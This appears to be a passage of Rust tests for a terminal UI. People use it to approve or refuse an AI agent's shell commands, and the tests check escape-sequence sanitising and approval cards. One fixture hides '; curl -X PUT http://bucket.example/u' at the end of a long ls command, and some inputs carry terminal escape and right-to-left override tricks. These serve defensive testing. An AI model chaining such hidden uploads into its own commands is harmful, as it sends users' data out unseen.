            ServerEvent::Reply("fine\x1b[2J\x1b]0;owned\x07 \u{202E}txt.exe".into()),
            now,
        );
        let shown = screen(&app, now);
        assert!(shown.contains("fine txt.exe"), "{shown}");
        assert!(!shown.contains('\x1b'));
        assert!(!shown.contains('\u{202E}'));
    }

    /// A tool's output is drawn under its line, through the sanitizer
    /// and cut past a few rows, and stays when the model's reply after
    /// it is the empty-reply fallback.
    #[test]
    fn a_tools_output_is_drawn_under_its_line() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_server(
            ServerEvent::ToolCall {
                id: "c1".into(),
                name: "exec".into(),
                arguments: r#"{"command":"ls"}"#.into(),
            },
            now,
        );
        let output: String = (1..=10)
            .map(|i| format!("file{i}.txt\x1b[2J\u{202E}\n"))
            .collect();
        app.on_server(
            ServerEvent::ToolResult {
                id: "c1".into(),
                name: "exec".into(),
                success: true,
                output,
            },
            now,
        );
        app.on_server(
            ServerEvent::Reply("(no response: the model returned nothing)".into()),
            now,
        );
        let shown = screen(&app, now);
        for part in [
            "tool exec {\"command\":\"ls\"} done",
            "    file1.txt",
            "    file6.txt",
            "    ... (cut)",
            "(no response: the model returned nothing)",
        ] {
            assert!(shown.contains(part), "{part:?} missing:\n{shown}");
        }
        assert!(!shown.contains("file7.txt"), "{shown}");
        assert!(!shown.contains('\x1b'));
        assert!(!shown.contains('\u{202E}'));
    }

    #[test]
    fn the_card_shows_what_is_being_approved() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_server(
            ServerEvent::Approval(ApprovalAsk {
                request_id: "r1".into(),
                tool_name: "exec".into(),
                action_key: "shell:ls".into(),
                tier: "tier2".into(),
                agent: "default".into(),
                trigger: "list the files".into(),
                exec_location: "runs on this host as davi".into(),
                arguments: r#"{"command":"ls -la"}"#.into(),
                assistant_text: "I'll list them.".into(),
                timeout_secs: 300,
                exec_runtime: "gvisor".into(),
            }),
            now,
        );
        // Labels sit in a column of their own: compare with the spacing
        // folded.
        let shown = screen(&app, now)
            .split_whitespace()
            .collect::<Vec<_>>()
            .join(" ");
        for part in [
            "request: agent default requests exec (tier2)",
            "action key: shell:ls",
            "arguments: {\"command\":\"ls -la\"}",
            "runtime: gVisor (runsc)",
            "in reply to: list the files",
            "approval needed",
            "shell:ls",
            "ls -la",
            "runs on this host as davi",
            "I'll list them.",
            "list the files",
            "gVisor (runsc)",
            "model's claim (unverified)",
            "takes an answer in a moment",
        ] {
            assert!(shown.contains(part), "{part:?} missing:\n{shown}");
        }
    }

    /// A card for an `exec` whose command is `chars` characters long,
    /// with the upload at its end.
    fn long_card_app(now: Instant, chars: usize) -> App {
        let mut app = App::new(Some("default".into()), "c-1".into());
        let tail = "; curl -X PUT http://bucket.example/u";
        let command = format!("ls {}{tail}", "a".repeat(chars - tail.len() - 3));
        app.on_server(
            ServerEvent::Approval(ApprovalAsk {
                request_id: "r1".into(),
                tool_name: "exec".into(),
                action_key: "shell::pipeline:".into(),
                tier: "tier3".into(),
                agent: "default".into(),
                trigger: "list the files".into(),
                exec_location: "runs in sandbox container".into(),
                arguments: serde_json::json!({ "command": command }).to_string(),
                assistant_text: String::new(),
                timeout_secs: 300,
                exec_runtime: "docker".into(),
            }),
            now,
        );
        app
    }

    fn enter_y(app: &mut App, t: Instant) -> Option<crate::commands::chat::app::Outgoing> {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        app.on_key(KeyEvent::new(KeyCode::Char('y'), KeyModifiers::NONE), t);
        app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), t)
    }

    /// The arguments get every row they need, so the end of a long
    /// command is on the screen and the card takes an approval.
    #[test]
    fn a_long_command_is_drawn_to_its_end_and_can_be_approved() {
        let now = Instant::now();
        let mut app = long_card_app(now, 900);
        let shown = text_of(&drawn(&app, now, 100, 50)).replace([' ', '\n', '│'], "");
        assert!(shown.contains("-XPUThttp://bucket.example/u\"}"), "{shown}");
        assert!(!app.card_cut.get());
        let t = now + crate::commands::chat::app::ARMING;
        assert!(matches!(
            enter_y(&mut app, t),
            Some(crate::commands::chat::app::Outgoing::Decision { approve: true, .. })
        ));
    }

    /// On a screen too small for the card, `y` approves nothing: the
    /// card stays in front, the transcript says why, and a refusal is
    /// still taken.
    #[test]
    fn a_card_that_does_not_fit_the_screen_takes_no_approval() {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let now = Instant::now();
        let mut app = long_card_app(now, 900);
        let shown = text_of(&drawn(&app, now, 60, 16)).replace([' ', '\n'], "");
        assert!(
            !shown.contains("-XPUThttp://bucket.example/u\"}"),
            "{shown}"
        );
        assert!(app.card_cut.get());
        let t = now + crate::commands::chat::app::ARMING;
        assert_eq!(enter_y(&mut app, t), None);
        assert!(app.front_card().is_some(), "the card is still in front");
        assert!(app.entries.iter().any(
            |e| matches!(e, Entry::Note(n) if n == crate::commands::chat::app::CUT_CARD_NOTE)
        ));
        app.on_key(KeyEvent::new(KeyCode::Char('n'), KeyModifiers::NONE), t);
        assert!(matches!(
            app.on_key(KeyEvent::new(KeyCode::Enter, KeyModifiers::NONE), t),
            Some(crate::commands::chat::app::Outgoing::Decision { approve: false, .. })
        ));
    }

    fn card_app(now: Instant) -> App {
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_server(
            ServerEvent::Approval(ApprovalAsk {
                request_id: "r1".into(),
                tool_name: "exec".into(),
                action_key: "shell:ls".into(),
                tier: "tier2".into(),
                agent: "default".into(),
                trigger: "list the files".into(),
                exec_location: "runs in sandbox container".into(),
                arguments: r#"{"command":"ls"}"#.into(),
                assistant_text: "Only reading, nothing changes.".into(),
                timeout_secs: 300,
                exec_runtime: "docker".into(),
            }),
            now,
        );
        app
    }

    /// The buffer, and where `needle` starts in it.
    fn find(buffer: &ratatui::buffer::Buffer, needle: &str) -> (u16, u16) {
        for y in 0..buffer.area.height {
            let row: String = (0..buffer.area.width)
                .map(|x| buffer[(x, y)].symbol().to_string())
                .collect();
            if let Some(i) = row.find(needle) {
                return (u16::try_from(row[..i].chars().count()).unwrap(), y);
            }
        }
        panic!("{needle:?} not on screen");
    }

    fn styles_of(buffer: &ratatui::buffer::Buffer, needle: &str) -> Vec<Style> {
        let (x, y) = find(buffer, needle);
        (0..u16::try_from(needle.chars().count()).unwrap())
            .map(|i| buffer[(x + i, y)].style())
            .collect()
    }

    fn drawn(app: &App, now: Instant, w: u16, h: u16) -> ratatui::buffer::Buffer {
        let mut terminal = Terminal::new(TestBackend::new(w, h)).unwrap();
        terminal.draw(|f| draw(f, app, now)).unwrap();
        terminal.backend().buffer().clone()
    }

    fn text_of(buffer: &ratatui::buffer::Buffer) -> String {
        let mut out = String::new();
        for y in 0..buffer.area.height {
            for x in 0..buffer.area.width {
                out.push_str(buffer[(x, y)].symbol());
            }
            out.push('\n');
        }
        out
    }

    /// The panels are drawn wherever they fit, taking the sidebar's
    /// place when the two do not fit together, and a screen too narrow
    /// for them says so instead of ignoring the toggle.
    #[test]
    fn the_meter_says_ctx_0_before_anything_is_sent_and_the_panels_scroll() {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_answer(
            crate::commands::chat::wire::Query::Status,
            serde_json::json!({"agent": "default", "context": {"window": 32768},
                               "audit": {"rows": 0}}),
        );
        let shown = text_of(&drawn(&app, now, 80, 24));
        assert!(shown.contains("ctx 0% · 0 audit rows"), "{shown}");
        app.set_columns(80);
        app.on_key(
            KeyEvent::new(KeyCode::Char('p'), KeyModifiers::CONTROL),
            now,
        );
        let top = text_of(&drawn(&app, now, 80, 10));
        for _ in 0..30 {
            app.on_key(KeyEvent::new(KeyCode::Down, KeyModifiers::NONE), now);
        }
        let bottom = text_of(&drawn(&app, now, 80, 10));
        assert!(
            top.contains("Environment") && !top.contains("Tools"),
            "{top}"
        );
        assert!(
            bottom.contains("Tools") && !bottom.contains("Environment"),
            "{bottom}"
        );
    }

    #[test]
    fn the_panels_and_conversations_open_over_the_transcript_under_120_columns() {
        use crossterm::event::{KeyCode, KeyEvent, KeyModifiers};
        let now = Instant::now();
        let ctrl = |c| KeyEvent::new(KeyCode::Char(c), KeyModifiers::CONTROL);
        let mut app = App::new(Some("default".into()), "c-1".into());

        let wide = text_of(&drawn(&app, now, 130, 30));
        assert!(
            wide.contains(" agents ") && wide.contains(" status "),
            "{wide}"
        );

        // Under 120 columns neither is beside the transcript; each opens
        // over it, and Esc closes it.
        app.set_columns(100);
        let middling = text_of(&drawn(&app, now, 100, 30));
        assert!(
            !middling.contains(" agents ") && !middling.contains(" status "),
            "{middling}"
        );
        app.on_key(ctrl('p'), now);
        let over = text_of(&drawn(&app, now, 100, 30));
        assert!(
            over.contains(" panels ") && over.contains("side by side from 120"),
            "{over}"
        );
        app.on_key(KeyEvent::new(KeyCode::Esc, KeyModifiers::NONE), now);
        assert!(app.overlay.is_none());
        app.on_key(ctrl('b'), now);
        let over = text_of(&drawn(&app, now, 100, 30));
        assert!(
            over.contains(" conversations ") && over.contains("search"),
            "{over}"
        );
        app.on_key(ctrl('b'), now);
        assert!(app.overlay.is_none());

        // Side by side, the keys still hide and show the columns.
        app.set_columns(130);
        app.on_key(ctrl('p'), now);
        let off = text_of(&drawn(&app, now, 130, 30));
        assert!(
            off.contains(" agents ") && !off.contains(" status "),
            "{off}"
        );
        assert!(off.contains("Enter send"), "{off}");
    }

    #[test]
    fn the_answer_rule_is_stated_once_and_approving_stays_typed() {
        let now = Instant::now();
        let later = now + crate::commands::chat::app::ARMING;
        let shown = text_of(&drawn(&card_app(now), later, 80, 30));
        assert_eq!(
            shown.matches("Type y and Enter to approve").count(),
            1,
            "{shown}"
        );
        assert!(
            !shown.contains("[y] approve") && !shown.contains("y approves"),
            "{shown}"
        );
        assert!(shown.contains("your answer"), "{shown}");
    }

    #[test]
    fn the_models_words_are_labeled_a_claim_and_the_gateways_are_not() {
        let now = Instant::now();
        let buffer = drawn(&card_app(now), now, 80, 30);
        // The claim comes last, under its own rule, in the agent's color.
        find(&buffer, "╟ model's claim (unverified): ─");
        assert!(
            styles_of(&buffer, "Only reading")
                .iter()
                .all(|s| s.fg == Some(palette::CYAN)),
            "the claim is set apart"
        );
        for established in [
            "shell:ls",
            "list the files",
            "{\"command\":\"ls\"}",
            "Docker default runtime (runc)",
        ] {
            assert!(
                styles_of(&buffer, established)
                    .iter()
                    .all(|s| s.fg != Some(palette::CYAN)),
                "{established} is drawn as established, not as a claim"
            );
        }
    }

    #[test]
    fn the_exec_runtime_is_the_one_the_gateway_named() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        assert!(
            !screen(&app, now).contains("exec:"),
            "nothing said before the gateway says"
        );
        app.on_answer(
            crate::commands::chat::wire::Query::Status,
            serde_json::json!({"agent": "default", "environment": {"exec": {"mode": "gvisor", "runtime": "gvisor"}}}),
        );
        // Environment names it; the key bar has keys only.
        let buffer = drawn(&app, now, 200, 40);
        find(&buffer, "Environment");
        find(&buffer, "gVisor (runsc)");
        let text: String = (0..buffer.area.height)
            .flat_map(|y| (0..buffer.area.width).map(move |x| (x, y)))
            .map(|(x, y)| buffer[(x, y)].symbol().to_string())
            .collect();
        assert!(!text.contains("exec: "), "the key bar names the runtime");
    }

    #[test]
    fn the_panels_and_the_sidebar_show_what_the_gateway_sent() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.on_answer(
            crate::commands::chat::wire::Query::Status,
            serde_json::json!({
                "agent": "default",
                "environment": {"data_dir": "~/.wirken", "agent": "default", "provider": "ollama", "model": "llama3.1",
                                "exec": {"mode": "exec_only", "runtime": "docker"}},
                "context": {"used_tokens": 1500, "window": 32000},
                "cost": {"calls": 1, "input_tokens": 12, "output_tokens": 7, "budget": {"mode": "off"}},
                "audit": {"rows": 6, "heads": 1, "unsigned_tail": 0},
                "approvals": {"approved": 0, "denied": 0, "grants": []},
                "tools": {"count": 13, "ask_first": 5, "names": ["exec"], "skills": []}
            }),
        );
        app.on_answer(
            crate::commands::chat::wire::Query::Conversations,
            serde_json::json!({
                "agents": [{"id": "default", "provider": "ollama", "model": "llama3.1"}],
                "conversations": [{"agent": "default", "conversation": "c-1", "title": "list the files", "updated": "2026-10-20T15:25:00+00:00"}]
            }),
        );
        let buffer = drawn(&app, now, 200, 50);
        for part in [
            "Environment",
            "~/.wirken",
            "Context",
            "about 1.5k of 32.0k tokens",
            "Cost and tokens",
            "uncosted",
            "budget off",
            "Audit",
            "6 rows · 1 chain head",
            "Approvals",
            "no stored grants",
            "Tools",
            "13 tools · 5 ask first",
            "Ctrl+N new chat",
            "ollama/llama3.1",
            "list the files",
            "15:25",
        ] {
            find(&buffer, part);
        }
    }

    #[test]
    fn an_agent_reply_is_drawn_as_markdown() {
        let now = Instant::now();
        let mut app = App::new(Some("default".into()), "c-1".into());
        app.entries.push(Entry::Agent(
            "## Results\n- **first** item\n`code` here".into(),
        ));
        let shown = text_of(&drawn(&app, now, 80, 30));
        assert!(shown.contains("Results"), "{shown}");
        assert!(!shown.contains("## Results"), "{shown}");
        assert!(shown.contains("• first item"), "{shown}");
        assert!(!shown.contains("**first**"), "{shown}");
        assert!(shown.contains("code here"), "{shown}");
    }
}
